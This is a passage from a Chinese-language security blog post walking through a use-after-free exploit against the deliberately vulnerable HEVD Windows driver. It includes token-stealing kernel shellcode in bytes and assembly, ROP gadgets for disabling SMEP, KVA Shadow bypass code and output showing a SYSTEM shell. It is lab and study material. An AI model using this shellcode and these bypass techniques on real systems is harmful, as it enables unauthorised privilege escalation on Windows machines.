<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFA78BF933D540</span><br><span class="line">ffffa78b`f933d540  00000000`deadbeef 00000000`00000000</span><br><span class="line">ffffa78b`f933d550  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d560  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d570  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d580  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d590  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000</span><br></pre></td></tr></table></figure>

<h4 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h4><p>使用keystone生成汇编</p>
<p>或者参考<a target="_blank" rel="noopener" href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD&#x2F;HEVD_UAF_WIN10_21H2.cpp</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xE5</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xC3</span> &#125;</span><br><span class="line"><span class="comment">// 反汇编</span></span><br><span class="line"><span class="number">0</span>:  <span class="number">65</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">88</span> <span class="number">01</span>    mov    rax,QWORD PTR gs:<span class="number">0x188</span>  </span><br><span class="line"><span class="number">7</span>:  <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">9</span>:  <span class="number">48</span> <span class="number">8b</span> <span class="number">80</span> b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    rax,QWORD PTR [rax+<span class="number">0xb8</span>]  </span><br><span class="line"><span class="number">10</span>: <span class="number">48</span> <span class="number">89</span> c3                mov    rbx,rax  </span><br><span class="line"><span class="number">13</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">9b</span> <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rbx,QWORD PTR [rbx+<span class="number">0x448</span>]  </span><br><span class="line"><span class="number">1</span>a: <span class="number">48</span> <span class="number">81</span> eb <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    sub    rbx,<span class="number">0x448</span>  </span><br><span class="line"><span class="number">21</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x440</span>]  </span><br><span class="line"><span class="number">28</span>: <span class="number">48</span> <span class="number">83</span> f9 <span class="number">04</span>             cmp    rcx,<span class="number">0x4</span>  </span><br><span class="line"><span class="number">2</span>c: <span class="number">75</span> e5                   jne    <span class="number">0x13</span>  </span><br><span class="line"><span class="number">2</span>e: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x4b8</span>]</span><br><span class="line"><span class="number">35</span>: <span class="number">80</span> e1 f0                <span class="keyword">and</span>    cl,<span class="number">0xf0</span>  </span><br><span class="line"><span class="number">38</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">88</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    QWORD PTR [rax+<span class="number">0x4b8</span>],rcx  </span><br><span class="line"><span class="number">3f</span>: <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    rax,rax  </span><br><span class="line"><span class="number">42</span>: c3                      ret</span><br></pre></td></tr></table></figure>

<p>是写成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFDC04FE779850</span><br><span class="line">ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800</span><br><span class="line">ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000</span><br><span class="line">ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348</span><br><span class="line">ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948</span><br><span class="line">ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8</span><br><span class="line">ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e</span><br><span class="line">ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000</span><br><span class="line">ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800</span><br></pre></td></tr></table></figure>

<p>但是直接写无法运行，无法提权：保护机制的绕过。</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>bypass KASLR: 获取内核基址 <code>ntoskrnl.exe</code> 地址：遍历驱动，获取内核基址<br>bypass SEMP&#x2F;SMAP: 修改CR4寄存器，将20，21位置0<br>bypass KVA Sahdow: 内核页表隔离KVA(KPTI)，也就是<a target="_blank" rel="noopener" href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a>，当执行内核代码时，用户态代码记录为 <code>NX</code></p>
<ul>
<li>AllocPoolWithTag 获得的内存一般是可执行的，因此可以往内存中写，然后执行</li>
<li>执行<code>swapgs</code>绕过，和Linux Kernel类似</li>
</ul>
<p>如果CR4寄存器的第20位被设置为1，那么就启用了SMEP；21位smap <a target="_blank" rel="noopener" href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>。这里看到smep，smap都存在。SMEP存在就可以执行用户态代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8</span><br><span class="line">2: kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     00000000`00350ef8</span><br><span class="line">  Decimal: 3477240</span><br><span class="line">  Decimal (unsigned) : 3477240</span><br><span class="line">  Octal:   0000000000000015207370</span><br><span class="line">  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000</span><br><span class="line">  Chars:   .....5..</span><br><span class="line">  Time:    Tue Feb 10 13:54:00 1970</span><br><span class="line">  Float:   low 4.87265e-039 high 0</span><br><span class="line">  Double:  1.71798e-317</span><br></pre></td></tr></table></figure>

<p>寻找ROP：仍然使用ropper&#x2F;ROPgadget工具，在 <code>ntoskrnl.exe</code> 寻找</p>
<ul>
<li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li>
</ul>
<p>寻找gadget</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; imagebase <span class="number">0</span>x0</span><br><span class="line">[INFO] Imagebase <span class="built_in">set</span> to <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x0000000000a1d523: mov cr4, rax; ret;</span><br><span class="line"><span class="number">0</span>x00000000003a0a87: mov cr4, rcx; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search pop rcx; ret</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x00000000002148c8: pop rcx; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov esp,</span><br><span class="line">...</span><br><span class="line">// 找 <span class="number">0</span>x1000 的倍数</span><br><span class="line"><span class="number">0</span>x00000000002f3f90: mov esp, <span class="number">0</span>x48000000; add esp, <span class="number">0</span>x28; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search swapgs</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x0000000000a18c22: swapgs; iretq; ret;</span><br><span class="line"><span class="number">0</span>x000000000041272f: swapgs; sysretq; ret;</span><br></pre></td></tr></table></figure>

<p>参考：<a target="_blank" rel="noopener" href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>为了不崩溃，shellcode需要添加bypass KVA Shadow。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line">start:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; KPCRB.<span class="built_in">CurrentThread</span> (_KTHREAD)</span><br><span class="line">  mov rax, [rax + <span class="number">0xb8</span>]     ; APCState.<span class="built_in">Process</span> (current _EPROCESS)</span><br><span class="line">  mov r8, rax               ; Store current _EPROCESS ptr in RBX</span><br><span class="line"> </span><br><span class="line">loop:</span><br><span class="line">  mov r8, [r8 + <span class="number">0x448</span>]      ; ActiveProcessLinks</span><br><span class="line">  sub r8, <span class="number">0x448</span>             ; Go back to start of _EPROCESS</span><br><span class="line">  mov r9, [r8 + <span class="number">0x440</span>]      ; <span class="built_in">UniqueProcessId</span> (PID)</span><br><span class="line">  cmp r9, <span class="number">4</span>                 ; SYSTEM PID? </span><br><span class="line">  jnz loop                  ; Loop until PID == <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">replace:</span><br><span class="line">  mov rcx, [r8 + <span class="number">0x4b8</span>]      ; Get SYSTEM token</span><br><span class="line">  <span class="keyword">and</span> cl, <span class="number">0xf0</span>               ; Clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">  mov [rax + <span class="number">0x4b8</span>], rcx     ; Copy SYSTEM token to current process</span><br><span class="line"> </span><br><span class="line">cleanup:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; _KPCR.Prcb.CurrentThread</span><br><span class="line">  mov cx, [rax + <span class="number">0x1e4</span>]     ; KTHREAD.KernelApcDisable</span><br><span class="line">  inc cx</span><br><span class="line">  mov [rax + <span class="number">0x1e4</span>], cx</span><br><span class="line">  mov rdx, [rax + <span class="number">0x90</span>]     ; ETHREAD.TrapFrame</span><br><span class="line">  mov rcx, [rdx + <span class="number">0x168</span>]    ; ETHREAD.TrapFrame.Rip</span><br><span class="line">  mov r11, [rdx + <span class="number">0x178</span>]    ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">  mov rsp, [rdx + <span class="number">0x180</span>]    ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">  mov rbp, [rdx + <span class="number">0x158</span>]    ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">  <span class="keyword">xor</span> eax, eax  ;</span><br><span class="line">  swapgs</span><br><span class="line">  o64 sysret </span><br></pre></td></tr></table></figure>

<p>某个地址读写，断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ba e1 &lt;ObjectAddr&gt;</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>\<span class="title">Desktop</span>\<span class="title">HEVDExploit.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">use</span> <span class="title">write</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Create</span> <span class="title">UAF</span> <span class="title">Object</span> <span class="title">then</span> <span class="title">free</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Prepare</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">UAF</span> <span class="title">object</span> <span class="title">then</span> <span class="title">write</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Trigger</span> <span class="title">UAF</span> <span class="title">callback</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [版本 10.0.19045.3930]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>。保留所有权利。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<p>感觉是一个小tip: VirtalAlloc 第一次shellcode可执行，可以跳转执行。第二次为内核申请栈空间，并且不允许换出内存，ROP关闭SMEP就可以执行shellcode。”taking a user-mode page and marking it as a kernel page”</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pShellcode, StealToken, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LPVOID pKernelStack = <span class="built_in">VirtualAlloc</span>((LPVOID)stackAddr, <span class="number">0x14000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualLock</span>(pKernelStack, <span class="number">0x14000</span>)) &#123;</span><br><span class="line">	<span class="built_in">Error</span>(<span class="string">&quot;VirtualLock&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Windows 无法验证此设备所需的驱动程序的数字签名。某软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明的恶意软件。</p>
<ul>
<li>更新与安全-&gt;恢复-&gt;高级启动-&gt;立刻重新启动-&gt;疑难解答-&gt;高级选项-&gt;禁用驱动强制签名（F7</li>
</ul>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>翻到了一篇CVE分析，其中利用到了token替换技术：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 漏洞利用</a>,一个优秀的利用对象：pipe</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>会在内核空间创建 <code>PipeAttribute</code>，PipeAttribute结构是在<code>PagedPool</code>中分配的内核空间中属性的表示，构造后可以造成任意地址的读写</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list ;</span><br><span class="line">    <span class="type">char</span> * AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> * AttributeValue;</span><br><span class="line">    <span class="type">char</span> data [<span class="number">0</span>];</span><br><span class="line"> &#125;;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line"> &#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>因此可以不写汇编而达到steal token 的目的</p>
<ul>
<li>使用适当的参数调用<code>NtQuerySystemInformation</code> API获取当前进程和拥有SYSTEM特权的System进程（PID 4）的_EPROCESS和_TOKEN</li>
<li>调用OpenProcessToken函数打开与当前进程关联的访问令牌</li>
<li>根据漏洞替换token</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276550.htm">win提权漏洞文章收集</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUrzLtg0D7uP+D&alichlgref=https://xz.aliyun.com/">Windows内核利用小总结</a></li>
<li><a target="_blank" rel="noopener" href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li>
<li><a target="_blank" rel="noopener" href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HEVD/" rel="tag"># HEVD</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/01/31/msf/" rel="prev" title="msf">
      <i class="fa fa-chevron-left"></i> msf
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/02/19/Qemu%20escape/" rel="next" title="Qemu escape">
      Qemu escape <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">编译项目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-API"><span class="nav-number">2.</span> <span class="nav-text">Windows API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8%E5%B1%82%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">3.</span> <span class="nav-text">驱动层权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">3.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%90%88%E9%80%82%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.</span> <span class="nav-text">寻找合适的对象</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-number">5.</span> <span class="nav-text">审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">6.1.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shellcode-1"><span class="nav-number">6.1.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP"><span class="nav-number">6.1.2.</span> <span class="nav-text">ROP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q-A"><span class="nav-number">7.</span> <span class="nav-text">Q&amp;A</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#More"><span class="nav-number">8.</span> <span class="nav-text">More</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">9.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ham5ter</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Ha0-Y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ha0-Y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ham5ter</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">292k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">8:50</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
